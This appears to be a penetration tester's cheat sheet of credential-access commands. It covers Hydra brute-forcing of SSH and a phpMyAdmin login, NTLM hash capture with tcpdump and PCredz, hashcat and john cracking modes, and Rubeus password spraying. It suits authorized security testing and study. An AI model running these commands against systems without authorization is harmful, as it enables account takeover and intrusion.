# Credential Access

## Password Guessing
### Hydra
**SSH**
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET -t4 ssh
```

**HTTP** (e.g., PHP login page)
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt $TARGET \
  http-post-form "/phpmyadmin/index.php?:pma_username=^USER^&pma_password=^PASS^:Cannot|without"
```

## Password Cracking
### PCredz
```bash
sudo tcpdump -ni eth0 -w ntlm.pcap
python ./Pcredz -f ntlm.pcap 
hashcat -a0 -w3 -m5600 NTLMv2.txt /usr/share/wordlists/rockyou.txt
john NTLMv2.txt
```

### Hashcat
**MD4**
```bash
hashcat -m 900 -a 0 hash.txt rockyou.txt
hashcat -m 900 -a 3 hash.txt ?l?l?l?l?l?l?l?l?l?l # brute force, 10 chars
hashcat -m 900 -a 3 -1 ?l?u?d hash.txt ?1?1?1?1?1 # lower, upper, decimal
hashcat -m 900 hash.txt rockyou.txt -r /opt/hashcat/rules/best64.rule
```

**MD5**
```bash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**NTLM**
```bash
hashcat -m 1000 -a 0 hash.txt rockyou.txt
```

## Password Spraying
### Rubeus
```bash
rubeus.exe brute /password:Password1 /noticket
```